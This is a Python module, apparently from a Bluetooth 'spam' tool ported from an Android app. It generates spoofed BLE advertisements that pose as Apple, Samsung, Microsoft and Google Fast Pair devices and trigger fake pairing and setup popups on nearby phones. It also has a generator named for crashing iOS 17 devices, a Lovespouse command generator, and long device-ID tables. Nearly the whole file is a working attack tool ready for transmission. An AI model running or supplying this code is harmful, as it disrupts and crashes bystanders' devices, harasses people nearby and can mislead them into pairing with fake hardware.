"""Advertisement payload generation.

Faithful port of the Android app's *AdvertisementSetGenerators*.  Each generator
returns a list of :class:`Packet` objects; calling ``render()`` produces the raw
LE advertising data (and optional scan response) with fresh random values, ready
to be handed to :class:`blespam.hci.HciDevice`.
"""

from __future__ import annotations

import random
import struct

# --------------------------------------------------------------------------
# AD structure builders (same wire format Android's AdvertiseData.Builder uses)
# --------------------------------------------------------------------------

MANUFACTURER_APPLE = 0x004C
MANUFACTURER_MICROSOFT = 0x0006
MANUFACTURER_SAMSUNG = 0x0075
MANUFACTURER_TYPO = 0xFFFF

FAST_PAIR_SERVICE_UUID = 0xFE2C


def ad_manufacturer(manuf_id: int, data: bytes) -> bytes:
    """Manufacturer Specific Data AD (type 0xFF)."""
    return bytes([1 + 2 + len(data), 0xFF]) + struct.pack("<H", manuf_id & 0xFFFF) + data


def ad_service_data_16(uuid16: int, data: bytes) -> bytes:
    """Service Data with 16-bit UUID AD (type 0x16)."""
    return bytes([1 + 2 + len(data), 0x16]) + struct.pack("<H", uuid16 & 0xFFFF) + data


def ad_tx_power(level: int) -> bytes:
    """TX Power Level AD (type 0x0A)."""
    return bytes([2, 0x0A, level & 0xFF])


def decode_hex(hex_str: str) -> bytes:
    return bytes.fromhex(hex_str)


# --------------------------------------------------------------------------
# Packet model
# --------------------------------------------------------------------------


class Packet:
    """One advertisement.  ``manufacturer`` and ``service`` hold either fixed
    ``bytes`` or a zero-argument callable returning ``bytes`` (used to inject
    fresh random data on every ``render()``)."""

    def __init__(self, title: str, target: str):
        self.title = title
        self.target = target
        self.manufacturer = None  # (manuf_id, bytes | callable)
        self.service = None  # (uuid16, bytes | callable)
        self.include_tx_power = False
        self.scan_response = None  # (manuf_id, bytes | callable) or None

    def render(self, tx_power: int = 0x06):
        parts = []
        if self.manufacturer is not None:
            mid, data = self.manufacturer
            data = data() if callable(data) else data
            parts.append(ad_manufacturer(mid, data))
        if self.service is not None:
            uuid16, data = self.service
            data = data() if callable(data) else data
            parts.append(ad_service_data_16(uuid16, data))
        if self.include_tx_power:
            parts.append(ad_tx_power(tx_power))
        adv = b"".join(parts)
        scan = None
        if self.scan_response is not None:
            mid, data = self.scan_response
            data = data() if callable(data) else data
            scan = ad_manufacturer(mid, data)
        return adv, scan


TARGET_IOS = "Apple (iOS)"
TARGET_WINDOWS = "Microsoft (Windows)"
TARGET_ANDROID = "Android / Fast Pair"
TARGET_SAMSUNG = "Samsung"
TARGET_LOVESPOUSE = "Lovespouse"


# --------------------------------------------------------------------------
# Apple Continuity helpers
# --------------------------------------------------------------------------


def _rand_buds_battery() -> int:
    """getRandomBudsBatteryLevel()"""
    return (((random.randint(0, 9) & 0xF) << 4) + random.randint(0, 9)) & 0xFF


def _rand_case_battery() -> int:
    """getRandomChargingCaseBatteryLevel()"""
    return (((random.randrange(8) % 8) << 4) + (random.randrange(10) % 10)) & 0xFF


def _rand_lid_counter() -> int:
    """getRandomLidOpenCounter()"""
    return random.randrange(256)


def _apple_new_device_payload(prefix: str, device_key: str, color_key: str) -> bytes:
    """AirPods-style ProximityPair payload (0x07 / 0x19) used by New Device,
    New AirTag and Not Your Device popups."""
    body = (
        "07"
        + "19"
        + prefix
        + device_key
        + "55"
        + f"{_rand_buds_battery():02x}"
        + f"{_rand_case_battery():02x}"
        + f"{_rand_lid_counter():02x}"
        + color_key
        + "00"
    )
    return decode_hex(body) + random.randbytes(16)


def _apple_action_payload(action: str, ios17_crash: bool) -> bytes:
    """NearbyAction payload (0x0F / 0x05), optionally with the iOS 17 crash
    appendix."""
    flag = 0xC0
    if action == "20" and random.random() < 0.5:
        flag = 0xBF
    elif action == "09" and random.random() < 0.5:
        flag = 0x40
    elif action == "21":
        flag = 0x40
    payload = decode_hex("0F05") + bytes([flag, int(action, 16)]) + random.randbytes(3)
    if ios17_crash:
        payload += decode_hex("000010") + random.randbytes(3)
    return payload


# --------------------------------------------------------------------------
# Generators
# --------------------------------------------------------------------------


def _continuity_generator(device_map, colors_map, prefix, title_fmt, target=TARGET_IOS):
    packets = []
    for dev_key, dev_name in device_map.items():
        colors = colors_map.get(dev_key, {"00": "White"})
        for color_key, color_name in colors.items():
            p = Packet(title_fmt.format(device=dev_name, color=color_name), target)
            p.manufacturer = (
                MANUFACTURER_APPLE,
                lambda dk=dev_key, ck=color_key: _apple_new_device_payload(prefix, dk, ck),
            )
            packets.append(p)
    return packets


def gen_apple_new_device(device_map, colors_map):
    return _continuity_generator(device_map, colors_map, "07", "New {device} {color}")


def gen_apple_new_airtag(device_map, colors_map):
    return _continuity_generator(device_map, colors_map, "05", "New {device} {color}")


def gen_apple_not_your_device(device_map, colors_map):
    return _continuity_generator(device_map, colors_map, "01", "Not your {device} {color}")


def gen_apple_action_modal(action_map):
    packets = []
    for action, name in action_map.items():
        p = Packet(name, TARGET_IOS)
        p.manufacturer = (
            MANUFACTURER_APPLE,
            lambda a=action: _apple_action_payload(a, ios17_crash=False),
        )
        packets.append(p)
    return packets


def gen_apple_ios17_crash(action_map):
    packets = []
    for action, name in action_map.items():
        p = Packet(name, TARGET_IOS)
        p.manufacturer = (
            MANUFACTURER_APPLE,
            lambda a=action: _apple_action_payload(a, ios17_crash=True),
        )
        packets.append(p)
    return packets


def gen_swift_pair():
    packets = []
    for i in range(1, 11):
        p = Packet(f"Device {i}", TARGET_WINDOWS)
        p.manufacturer = (
            MANUFACTURER_MICROSOFT,
            decode_hex("030080") + f"Device {i}".encode(),
        )
        packets.append(p)
    return packets


def gen_easy_setup_buds(device_map):
    prepended = decode_hex("42098102141503210109")
    appended = decode_hex("063C948E00000000C700")
    packets = []
    for dev_key, name in device_map.items():
        p = Packet(name, TARGET_SAMSUNG)
        payload = prepended + decode_hex(dev_key[:4] + "01" + dev_key[4:]) + appended
        p.manufacturer = (MANUFACTURER_SAMSUNG, payload)
        p.scan_response = (MANUFACTURER_SAMSUNG, decode_hex("0000000000000000000000000000"))
        packets.append(p)
    return packets


def gen_easy_setup_watch(device_map):
    prepended = decode_hex("010002000101FF000043")
    packets = []
    for dev_key, name in device_map.items():
        p = Packet(name, TARGET_SAMSUNG)
        p.manufacturer = (MANUFACTURER_SAMSUNG, prepended + decode_hex(dev_key))
        packets.append(p)
    return packets


def _fast_pair(device_map, target=TARGET_ANDROID, include_tx_power=True):
    packets = []
    for dev_key, name in device_map.items():
        p = Packet(name, target)
        p.service = (FAST_PAIR_SERVICE_UUID, decode_hex(dev_key))
        p.include_tx_power = include_tx_power
        packets.append(p)
    return packets


def gen_lovespouse(play_map):
    packets = []
    for dev_key, name in play_map.items():
        p = Packet(name, TARGET_LOVESPOUSE)
        p.manufacturer = (
            MANUFACTURER_TYPO,
            decode_hex("FFFF006DB643CE97FE427C" + dev_key + "03038FAE"),
        )
        packets.append(p)
    return packets


# --------------------------------------------------------------------------
# Device maps (ported from the Android generators)
# --------------------------------------------------------------------------

APPLE_NEW_DEVICE = {"0E20": "AirPods Pro", "0A20": "AirPods Max", "0220": "AirPods", "0F20": "AirPods 2nd Gen", "1320": "AirPods 3rd Gen", "1420": "AirPods Pro 2nd Gen", "1020": "Beats Flex", "0620": "Beats Solo 3", "0320": "Powerbeats 3", "0B20": "Powerbeats Pro", "0C20": "Beats Solo Pro", "1120": "Beats Studio Buds", "0520": "Beats X", "0920": "Beats Studio 3", "1720": "Beats Studio Pro", "1220": "Beats Fit Pro", "1620": "Beats Studio Buds+"}
APPLE_NEW_AIRTAG = {"0055": "Airtag", "0030": "Hermes Airtag"}
APPLE_NEW_AIRTAG_COLORS = {"0055": {"00": "White"}, "0030": {"00": "White"}}
APPLE_NOT_YOUR_DEVICE = {"0E20": "AirPods Pro", "0A20": "AirPods Max", "0220": "AirPods", "0F20": "AirPods 2nd Gen", "1320": "AirPods 3rd Gen", "1420": "AirPods Pro 2nd Gen", "1020": "Beats Flex", "0620": "Beats Solo 3", "0320": "Powerbeats 3", "0B20": "Powerbeats Pro", "0C20": "Beats Solo Pro", "1120": "Beats Studio Buds", "0520": "Beats X", "0920": "Beats Studio 3", "1720": "Beats Studio Pro", "1220": "Beats Fit Pro", "1620": "Beats Studio Buds+"}
APPLE_NOT_YOUR_DEVICE_COLORS = {"0E20": {"00": "White"}, "0A20": {"00": "White", "02": "Red", "03": "Blue", "0F": "Black", "11": "Light Green"}, "0220": {"00": "White"}, "0F20": {"00": "White"}, "1320": {"00": "White"}, "1420": {"00": "White"}, "1020": {"00": "White", "01": "Black"}, "0620": {"00": "White", "01": "Black", "06": "Gray", "07": "Gold/White", "08": "Rose Gold", "09": "Black", "0E": "Violet/White", "0F": "Bright Red", "12": "Dark Red", "13": "Swamp Green", "14": "Dark Gray", "15": "Dark Blue", "1D": "Rose Gold 2", "20": "Blue/Green", "21": "Purple/Orange", "22": "Deep Blue/ Light blue", "23": "Magenta/Light Fuchsia", "25": "Black/Red", "2A": "Gray / Disney LTD", "2E": "Pinkish white", "3D": "Red/Blue", "3E": "Yellow/Blue", "3F": "White/Red", "40": "Purple/White", "5B": "Gold", "5C": "Silver"}, "0320": {"00": "White", "01": "Black", "0B": "Gray/Blue", "0C": "Gray/Red", "0D": "Gray/Green", "12": "Red", "13": "Swamp Green", "14": "Gray", "15": "Deep Blue", "17": "Dark with Gold Logo"}, "0B20": {"00": "White", "02": "Yellowish Green", "03": "Blue", "04": "Black", "05": "Pink", "06": "Red", "0B": "Gray ?", "0D": "Sky Blue"}, "0C20": {"00": "White", "01": "Black"}, "1120": {"00": "White", "01": "Black", "02": "Red", "03": "Blue", "04": "Pink", "06": "Silver"}, "0520": {"00": "White", "01": "Black", "02": "Blue", "05": "Gray", "1D": "Pink", "25": "Dark/Red"}, "0920": {"00": "White", "01": "Black", "02": "Red", "03": "Blue", "18": "Shadow Gray", "19": "Desert Sand", "25": "Black / Red", "26": "Midnight Black", "27": "Desert Sand 2", "28": "Gray", "29": "Clear blue/ gold", "42": "Green Forest camo", "43": "White Camo"}, "1720": {"00": "White", "01": "Black"}, "1220": {"00": "White", "01": "Black", "02": "Pink", "03": "Grey/White", "04": "Full Pink", "05": "Neon Green", "06": "Night Blue", "07": "Light Pink", "08": "Brown", "09": "Dark Brown"}, "1620": {"00": "Black", "01": "White", "02": "Transparent", "03": "Silver", "04": "Pink"}}
APPLE_ACTION_MODAL = {"13": "AppleTV AutoFill", "27": "AppleTV Connecting...", "20": "Join This AppleTV?", "19": "AppleTV Audio Sync", "1E": "AppleTV Color Balance", "09": "Setup New iPhone", "02": "Transfer Phone Number", "0B": "HomePod Setup", "01": "Setup New AppleTV", "06": "Pair AppleTV", "0D": "HomeKit AppleTV Setup", "2B": "AppleID for AppleTV?", "05": "Apple Watch", "24": "Apple Vision Pro", "2F": "Connect to other Device", "21": "Software Update"}
APPLE_IOS17_CRASH = {"13": "AppleTV AutoFill", "27": "AppleTV Connecting...", "20": "Join This AppleTV?", "19": "AppleTV Audio Sync", "1E": "AppleTV Color Balance", "09": "Setup New iPhone", "02": "Transfer Phone Number", "0B": "HomePod Setup", "01": "Setup New AppleTV", "06": "Pair AppleTV", "0D": "HomeKit AppleTV Setup", "2B": "AppleID for AppleTV?"}
SAMSUNG_BUDS = {"EE7A0C": "Fallback Buds", "9D1700": "Fallback Dots", "39EA48": "Light Purple Buds2", "A7C62C": "Bluish Silver Buds2", "850116": "Black Buds Live", "3D8F41": "Gray & Black Buds2", "3B6D02": "Bluish Chrome Buds2", "AE063C": "Gray Beige Buds2", "B8B905": "Pure White Buds", "EAAA17": "Pure White Buds2", "D30704": "Black Buds", "9DB006": "French Flag Buds", "101F1A": "Dark Purple Buds Live", "859608": "Dark Blue Buds", "8E4503": "Pink Buds", "2C6740": "White & Black Buds2", "3F6718": "Bronze Buds Live", "42C519": "Red Buds Live", "AE073A": "Black & White Buds2", "011716": "Sleek Black Buds2"}
SAMSUNG_WATCH = {"1A": "Fallback Watch", "01": "White Watch4 Classic 44m", "02": "Black Watch4 Classic 40m", "03": "White Watch4 Classic 40m", "04": "Black Watch4 44mm", "05": "Silver Watch4 44mm", "06": "Green Watch4 44mm", "07": "Black Watch4 40mm", "08": "White Watch4 40mm", "09": "Gold Watch4 40mm", "0A": "French Watch4", "0B": "French Watch4 Classic", "0C": "Fox Watch5 44mm", "11": "Black Watch5 44mm", "12": "Sapphire Watch5 44mm", "13": "Purpleish Watch5 40mm", "14": "Gold Watch5 40mm", "15": "Black Watch5 Pro 45mm", "16": "Gray Watch5 Pro 45mm", "17": "White Watch5 44mm", "18": "White & Black Watch5", "1B": "Black Watch6 Pink 40mm", "1C": "Gold Watch6 Gold 40mm", "1D": "Silver Watch6 Cyan 44mm", "1E": "Black Watch6 Classic 43m", "20": "Green Watch6 Classic 43m"}
FASTPAIR_DEVICES = {"DAE096": "adidas RPT-02 SOL", "A83C10": "adidas Z.N.E. 01", "002000": "AIAIAI TMA-2 (H60)", "9B7339": "AKG N9 Hybrid", "202B3D": "Amazfit PowerBuds", "070000": "Android Auto", "470000": "Arduino 101", "02D815": "ATH-CK1TW", "1EE890": "ATH-CKS30TW WH", "E6E771": "ATH-CKS50TW", "CAB6B8": "ATH-M20xBT", "9C3997": "ATH-M50xBT2", "9939BC": "ATH-SQ1TW", "D7102F": "ATH-SQ1TW SVN", "CA7030": "ATH-TWX7", "05AA91": "B&O Beoplay E6", "91AA05": "B&O Beoplay E6", "03AA91": "B&O Beoplay H8i", "91AA03": "B&O Beoplay H8i", "02AA91": "B&O Earset", "91AA02": "B&O Earset", "038F16": "Beats Studio Buds", "00AA91": "Beoplay E8 2.0", "91AA00": "Beoplay E8 2.0", "D6E870": "Beoplay EX", "04AA91": "Beoplay H4", "91AA04": "Beoplay H4", "01AA91": "Beoplay H9 3rd Generation", "91AA01": "Beoplay H9 3rd Generation", "109201": "Beoplay H9 3rd Generation", "DF271C": "Big Bang e Gen 3", "532011": "Big Bang e Gen 3", "DA5200": "blackbox TRIP II", "0052DA": "blackbox TRIP II", "124366": "BLE-Phone", "8D13B9": "BLE-TWS", "00A168": "boAt \xa0Airdopes 621", "1F5865": "boAt Airdopes 441", "641630": "boAt Airdopes 452", "8E5550": "boAt Airdopes 511v2", "21521D": "boAt Rockerz 355 (Green)", "CD8256": "Bose NC 700", "A7E52B": "Bose NC 700 Headphones", "DF9BA4": "Bose NC 700 Headphones", "5BACD6": "Bose QC Ultra Earbuds", "8A31B7": "Bose QC Ultra Headphones", "0000F0": "Bose QuietComfort 35 II", "F00000": "Bose QuietComfort 35 II", "F00001": "Bose QuietComfort 35 II", "0100F0": "Bose QuietComfort 35 II", "DADE43": "Chromebox", "013D8A": "Cleer EDGE Voice", "8A3D01": "Cleer EDGE Voice", "8A3D00": "Cleer FLOW Ⅱ", "003D8A": "Cleer FLOW Ⅱ", "D7E3EB": "Cleer HALO", "0F0993": "COUMI TWS-834A", "038B91": "DENON AH-C830NCW", "213C8C": "DIZO Wireless Power", "DEE8C0": "Ear (2)", "9CE3C7": "EDIFIER NeoBuds Pro 2", "994374": "EDIFIER W320TN", "0DEC2B": "Emporio Armani EA Connected", "C7A267": "Fake Test Mouse", "480000": "Fast Pair Headphones", "490000": "Fast Pair Headphones", "000049": "Fast Pair Headphones", "5CEE3C": "Fitbit Charge 4", "080000": "Foocorp Foophones", "915CFA": "Galaxy A14", "89BAD5": "Galaxy A23 5G", "8E1996": "Galaxy A24 5g", "A8CAAD": "Galaxy F04", "8D16EA": "Galaxy M14 5G", "9D7D42": "Galaxy S20", "E4E457": "Galaxy S20 5G", "06AE20": "Galaxy S21 5G", "99F098": "Galaxy S22 Ultra", "8C4236": "GLIDiC mameBuds", "0B0000": "Google Gphones", "0C0000": "Google Gphones", "00000C": "Google Gphones", "000006": "Google Pixel buds", "060000": "Google Pixel Buds", "9B9872": "Hyundai", "DAD3A6": "Jabra Elite 10", "00AA48": "Jabra Elite 2", "1F2E13": "Jabra Elite 2", "1F4589": "Jabra Elite 2", "9101F0": "Jabra Elite 2", "6BA5C3": "Jabra Elite 4", "8C07D2": "Jabra Elite 4 Active", "DA4577": "Jabra Elite 4 Active", "8B0A91": "Jabra Elite 5", "D5A59E": "Jabra Elite Speaker", "9171BE": "Jabra Evolve2 65 Flex", "C79B91": "Jabra Evolve2 75", "E750CE": "Jabra Evolve2 75", "C8777E": "Jaybird Vista 2", "CAF511": "Jaybird Vista 2", "F52494": "JBL Buds Pro", "A8001A": "JBL CLUB ONE", "A7EF76": "JBL CLUB PRO+ TWS", "D933A7": "JBL ENDURANCE PEAK 3", "C85D7A": "JBL ENDURANCE PEAK II", "A8F96D": "JBL ENDURANCE RUN 2 WIRELESS", "0002F0": "JBL Everest 110GA", "F00201": "JBL Everest 110GA", "F00200": "JBL Everest 110GA", "F00202": "JBL Everest 110GA", "0102F0": "JBL Everest 110GA", "0202F0": "JBL Everest 110GA", "F00204": "JBL Everest 310GA", "F00205": "JBL Everest 310GA", "F00206": "JBL Everest 310GA", "F00203": "JBL Everest 310GA", "0602F0": "JBL Everest 310GA", "0302F0": "JBL Everest 310GA", "0402F0": "JBL Everest 310GA", "0502F0": "JBL Everest 310GA", "F00208": "JBL Everest 710GA", "F00207": "JBL Everest 710GA", "0702F0": "JBL Everest 710GA", "0802F0": "JBL Everest 710GA", "821F66": "JBL Flip 6", "071C74": "JBL Flip 6", "5BE3D4": "JBL Flip 6", "718FA4": "JBL Live 300TWS", "02F637": "JBL LIVE FLEX", "6C4DE5": "JBL LIVE PRO 2 TWS", "8CB05C": "JBL LIVE PRO+ TWS", "C6936A": "JBL LIVE PRO+ TWS", "05C452": "JBL LIVE220BT", "5C8AA5": "JBL LIVE220BT", "A90358": "JBL LIVE220BT", "F00209": "JBL LIVE400BT", "F0020A": "JBL LIVE400BT", "F0020B": "JBL LIVE400BT", "F0020C": "JBL LIVE400BT", "F0020D": "JBL LIVE400BT", "F0020F": "JBL LIVE500BT", "F0020E": "JBL LIVE500BT", "F00212": "JBL LIVE500BT", "F00211": "JBL LIVE500BT", "F00210": "JBL LIVE500BT", "F00213": "JBL LIVE650BTNC", "F00214": "JBL LIVE650BTNC", "F00215": "JBL LIVE650BTNC", "A8A72A": "JBL LIVE670NC", "0660D7": "JBL LIVE770NC", "C7D620": "JBL Pulse 5", "DFD433": "JBL REFLECT AERO", "E69877": "JBL REFLECT AERO", "02D886": "JBL REFLECT MINI NC", "1FF8FA": "JBL REFLECT MINI NC", "DCF33C": "JBL REFLECT MINI NC", "9B735A": "JBL RFL FLOW PRO", "D9414F": "JBL SOUNDGEAR SENSE", "664454": "JBL TUNE 520BT", "04AFB8": "JBL TUNE 720BT", "A8E353": "JBL TUNE BEAM", "E09172": "JBL TUNE BEAM", "0F232A": "JBL TUNE BUDS", "054B2D": "JBL TUNE125TWS", "D97EBA": "JBL TUNE125TWS", "5BD6C9": "JBL TUNE225TWS", "5C0C84": "JBL TUNE225TWS", "9BC64D": "JBL TUNE225TWS", "9C98DB": "JBL TUNE225TWS", "A9394A": "JBL TUNE230NC TWS", "A8C636": "JBL TUNE660NC", "CC5F29": "JBL TUNE660NC", "D9964B": "JBL TUNE670NC", "038CC7": "JBL TUNE760NC", "02DD4F": "JBL TUNE770NC", "91C813": "JBL TUNE770NC", "F00E97": "JBL VIBE BEAM", "0F1B8D": "JBL VIBE BEAM", "9C0AF7": "JBL VIBE BUDS", "C7FBCC": "JBL VIBE FLEX", "04ACFC": "JBL WAVE BEAM", "E64613": "JBL WAVE BEAM", "A92498": "JBL WAVE BUDS", "549547": "JBL WAVE BUDS", "1ED9F9": "JBL WAVE FLEX", "9C4058": "JBL WAVE FLEX", "C9836A": "JBL Xtreme 4", "D654CD": "JBL Xtreme 4", "9CF08F": "JLab Epic Air ANC", "8AADAE": "JLab GO Work 2", "8CAD81": "KENWOOD WS-A1", "F00304": "LG HBS-1010", "0403F0": "LG HBS-1010", "F00307": "LG HBS-1120", "0703F0": "LG HBS-1120", "F00308": "LG HBS-1125", "0803F0": "LG HBS-1125", "F00305": "LG HBS-1500", "0503F0": "LG HBS-1500", "F00306": "LG HBS-1700", "0603F0": "LG HBS-1700", "F00309": "LG HBS-2000", "0903F0": "LG HBS-2000", "F00302": "LG HBS-830", "0203F0": "LG HBS-830", "F00301": "LG HBS-835", "0103F0": "LG HBS-835", "0003F0": "LG HBS-835S", "F00300": "LG HBS-835S", "F00303": "LG HBS-930", "0303F0": "LG HBS-930", "91BD38": "LG HBS-FL7", "9AEEA4": "LG HBS-FN4", "D6C195": "LG HBS-SL5", "9CD0F3": "LG HBS-TFN7", "5C4A7E": "LG HBS-XL7", "DB8AC7": "LG TONE-FREE", "92255E": "LG-TONE-FP6", "625740": "LG-TONE-NP3", "8E14D7": "LG-TONE-TFP8", "003000": "Libratone Q Adapt On-Ear", "003001": "Libratone Q Adapt On-Ear", "917E46": "LinkBuds", "861698": "LinkBuds", "1F181A": "LinkBuds S", "9C6BC0": "LinkBuds S", "C8162A": "LinkBuds S", "E06116": "LinkBuds S", "003B41": "M&D MW65", "050F0C": "Major III Voice", "039F8F": "Michael Kors Darci 5e", "CCBB7E": "MIDDLETON", "052CC7": "MINOR III", "D8058C": "MOTIF II A.N.C.", "596007": "MOTIF II A.N.C.", "9A408A": "MOTO BUDS 065", "03C99C": "MOTO BUDS 135", "D5B5F7": "MOTO BUDS 600 ANC", "0DC6BF": "My Awesome Device II", "07F426": "Nest Hub Max", "011242": "Nirvana Ion", "855347": "NIRVANA NEBULA", "A8A00E": "Nokia CB-201", "6B9304": "Nokia SB-101", "8BB0A0": "Nokia Solo Bud+", "8E4666": "Oladance Wearable Stereo", "E57363": "Oladance Wearable Stereo", "8BF79A": "Oladance Whisper E1", "E07634": "OnePlus Buds Z", "06C197": "OPPO Enco Air3 Pro", "DD4EC0": "OPPO Enco Air3 Pro", "6B8C65": "oraimo FreePods 4", "A8845A": "oraimo FreePods 4", "21A04E": "oraimo FreePods Pro", "614199": "Oraimo FreePods Pro", "99D7EA": "oraimo OpenCirclet", "005BC3": "Panasonic RP-HD610N", "D65F4E": "Philips Fidelio T2", "C7736C": "Philips PH805", "0ECE95": "Philips TAT3508", "00FA72": "Pioneer SE-MS9BN", "8D5B67": "Pixel 90c", "92BBBD": "Pixel Buds", "0582FD": "Pixel Buds", "6B1C64": "Pixel Buds", "8B66AB": "Pixel Buds A-Series", "9ADB11": "Pixel Buds Pro", "C8E228": "Pixel Buds Pro", "D87A3E": "Pixel Buds Pro", "567679": "Pixel Buds Pro", "035754": "Plantronics PLT_K2", "045754": "Plantronics PLT_K2", "284500": "Plantronics PLT_K2", "035764": "PLT V8200 Series", "045764": "PLT V8200 Series", "E6E8B8": "POCO Pods", "0E30C3": "Razer Hammerhead TWS", "72EF8D": "Razer Hammerhead TWS X", "E6E37E": "realme Buds \xa0Air 5 Pro", "8C6B6A": "realme Buds Air 3S", "8CD10F": "realme Buds Air Pro", "D8F4E8": "realme Buds T100", "D5C6CE": "realme TechLife Buds T100", "D6EE84": "Rockerz 255 Max", "A8658F": "ROCKSTER GO", "989D0A": "Set up your new Pixel 2", "E64CC6": "Set up your new Pixel 3 XL", "00C95C": "Sony WF-1000X", "01C95C": "Sony WF-1000X", "5CC900": "Sony WF-1000X", "5CC901": "Sony WF-1000X", "5CC938": "Sony WF-1000XM3", "5CC939": "Sony WF-1000XM3", "5CC93A": "Sony WF-1000XM3", "5CC93B": "Sony WF-1000XM3", "2D7A23": "Sony WF-1000XM4", "1EC95C": "Sony WF-SP700N", "1FC95C": "Sony WF-SP700N", "20C95C": "Sony WF-SP700N", "5CC91E": "Sony WF-SP700N", "5CC91F": "Sony WF-SP700N", "5CC920": "Sony WF-SP700N", "5CC921": "Sony WF-SP700N", "5CC922": "Sony WF-SP700N", "5CC923": "Sony WF-SP700N", "5CC924": "Sony WF-SP700N", "5CC925": "Sony WF-SP700N", "5CC926": "Sony WF-SP700N", "5CC927": "Sony WF-SP700N", "02C95C": "Sony WH-1000XM2", "03C95C": "Sony WH-1000XM2", "06C95C": "Sony WH-1000XM2", "07C95C": "Sony WH-1000XM2", "5CC902": "Sony WH-1000XM2", "5CC903": "Sony WH-1000XM2", "5CC906": "Sony WH-1000XM2", "5CC907": "Sony WH-1000XM2", "0DC95C": "Sony WH-1000XM3", "5CC90A": "Sony WH-1000XM3", "5CC90B": "Sony WH-1000XM3", "5CC90C": "Sony WH-1000XM3", "5CC90D": "Sony WH-1000XM3", "706908": "Sony WH-1000XM3", "837980": "Sony WH-1000XM3", "5CC932": "Sony WH-CH700N", "5CC933": "Sony WH-CH700N", "5CC934": "Sony WH-CH700N", "5CC935": "Sony WH-CH700N", "5CC936": "Sony WH-CH700N", "5CC937": "Sony WH-CH700N", "5CC928": "Sony WH-H900N", "5CC929": "Sony WH-H900N", "5CC92A": "Sony WH-H900N", "5CC92B": "Sony WH-H900N", "5CC92C": "Sony WH-H900N", "5CC92D": "Sony WH-H900N", "5CC92E": "Sony WH-H900N", "5CC92F": "Sony WH-H900N", "5CC930": "Sony WH-H900N", "5CC931": "Sony WH-H900N", "5CC93C": "Sony WH-XB700", "5CC93D": "Sony WH-XB700", "5CC93E": "Sony WH-XB700", "5CC93F": "Sony WH-XB700", "5CC940": "Sony WH-XB900N", "5CC941": "Sony WH-XB900N", "5CC942": "Sony WH-XB900N", "5CC943": "Sony WH-XB900N", "5CC944": "Sony WH-XB900N", "5CC945": "Sony WH-XB900N", "05C95C": "Sony WI-1000X", "04C95C": "Sony WI-1000X", "5CC904": "Sony WI-1000X", "5CC905": "Sony WI-1000X", "5CC908": "Sony WI-1000X", "5CC909": "Sony WI-1000X", "575836": "Sony WI-1000X", "641372": "Sony WI-1000X", "0EC95C": "Sony WI-C600N", "5CC90E": "Sony WI-C600N", "5CC90F": "Sony WI-C600N", "5CC910": "Sony WI-C600N", "5CC911": "Sony WI-C600N", "5CC912": "Sony WI-C600N", "5CC913": "Sony WI-C600N", "5CC914": "Sony WI-SP600N", "5CC915": "Sony WI-SP600N", "5CC916": "Sony WI-SP600N", "5CC917": "Sony WI-SP600N", "5CC918": "Sony WI-SP600N", "5CC919": "Sony WI-SP600N", "5CC91A": "Sony WI-SP600N", "5CC91B": "Sony WI-SP600N", "5CC91C": "Sony WI-SP600N", "5CC91D": "Sony WI-SP600N", "D446A7": "Sony XM5", "CB529D": "soundcore Glow", "008F7D": "soundcore Glow Mini", "06D8FC": "soundcore Liberty 4 NC", "9CB881": "soundcore Motion 300", "E020C1": "soundcore Motion 300", "CB2FE7": "soundcore Motion X500", "DEDD6F": "soundcore Space One", "72FB00": "Soundcore Spirit Pro GVA", "DA0F83": "SPACE", "DF4B02": "SRS-XB13", "20330C": "SRS-XB33", "91DABC": "SRS-XB33", "E5B91B": "SRS-XB33", "1E8B18": "SRS-XB43", "20CC2C": "SRS-XB43", "C6EC5F": "SRS-XE300", "1F4627": "SRS-XG300", "9CEFD1": "SRS-XG500", "C878AA": "SRS-XV800", "201C7C": "SUMMIT", "DEC04C": "SUMMIT", "E57B57": "Super Device", "CC93A5": "Sync", "DF01E3": "Sync", "DF42DE": "TAG Heuer Calibre E4 42mm", "1F1101": "TAG Heuer Calibre E4 45mm", "E5440B": "TAG Heuer Calibre E4 45mm", "9128CB": "TCL MOVEAUDIO Neo", "02E2A9": "TCL MOVEAUDIO S200", "5C55E7": "TCL MOVEAUDIO S200", "0744B6": "Technics EAH-AZ60M2", "0A0000": "Test 00000a - Anti-Spoofing", "00000A": "Test 00000a - Anti-Spoofing", "350000": "Test 000035", "090000": "Test Android TV", "DE577F": "Teufel AIRY TWS 2", "1EEDF5": "Teufel REAL BLUE TWS 3", "6AD226": "TicWatch Pro 3", "8B5A7B": "TicWatch Pro 3 GPS", "057802": "TicWatch Pro 5", "D69B2B": "TONE-T80S", "1FE765": "TONE-TF7Q", "6C42C0": "TWS05", "997B4A": "UA | JBL True Wireless Flash X", "C6ABEA": "UA | JBL True Wireless Flash X", "5C0206": "UA | JBL TWS STREAK", "9D00A6": "Urbanears Juno", "CB093B": "Urbanears Juno", "C8D335": "WF-1000XM4", "C9186B": "WF-1000XM4", "DBE5B1": "WF-1000XM4", "8A8F23": "WF-1000XM5", "E5B4B0": "WF-1000XM5", "DE215D": "WF-C500", "1FBB50": "WF-C700N", "07A41C": "WF-C700N", "C69AFD": "WF-H800 (h.ear)", "0E138D": "WF-SP800N", "20A19B": "WF-SP800N", "5BA9B5": "WF-SP800N", "A88B69": "WF-SP800N", "01EEB4": "WH-1000XM4", "058D08": "WH-1000XM4", "CC438E": "WH-1000XM4", "126644": "WH-1000XM4", "5C7CDC": "WH-1000XM5", "9CB5F3": "WH-1000XM5", "D8F3BA": "WH-1000XM5", "0F2D16": "WH-CH520", "5C4833": "WH-CH720N", "99C87B": "WH-H810 (h.ear)", "DC5249": "WH-H810 (h.ear)", "DEF234": "WH-H810 (h.ear)", "9C888B": "WH-H910N (h.ear)", "9A9BDD": "WH-XB910N", "D820EA": "WH-XB910N", "1E955B": "WI-1000XM2", "9BE931": "WI-C100", "05A963": "WONDERBOOM 3", "03F5D4": "Writing Account Key", "DEEA86": "Xiaomi Buds 4 Pro", "D90617": "Xiaomi Redmi Buds 4 Active", "C8C641": "Xiaomi Redmi Buds 4 Lite", "612907": "Xiaomi Redmi Buds 4 Lite", "913B0C": "YH-E700B", "9DB896": "Your BMW", "03B716": "YY2963", "9CA277": "YY2963", "CC754F": "YY2963", "8C1706": "YY7861E", "E5E2E9": "Zone Wireless 2"}
FASTPAIR_PHONE_SETUP = {"00000C": "Google Gphones Transfer", "0577B1": "Galaxy S23 Ultra", "05A9BC": "Galaxy S20+"}
